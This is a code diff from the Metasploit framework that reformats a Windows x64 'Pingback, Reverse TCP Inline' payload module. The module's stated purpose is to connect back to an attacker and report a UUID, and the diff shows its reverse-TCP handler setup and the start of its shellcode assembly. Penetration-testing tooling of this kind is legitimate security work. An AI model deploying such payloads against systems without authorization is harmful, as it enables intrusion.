@@ -4,7 +4,6 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 425
 
   include Msf::Payload::Windows
@@ -15,16 +14,19 @@ module MetasploitModule
   include Msf::Payload::Windows::Exitfunk_x64
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows x64 Pingback, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and report UUID (Windows x64)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
 
     def required_space
       # Start with our cached default generated size
@@ -48,7 +50,6 @@ module MetasploitModule
       self.pingback_uuid ||= self.generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
       conf = { exitfunk: datastore['EXITFUNC'] }
-
 
       asm = %Q^
         cld                     ; Clear the direction flag.
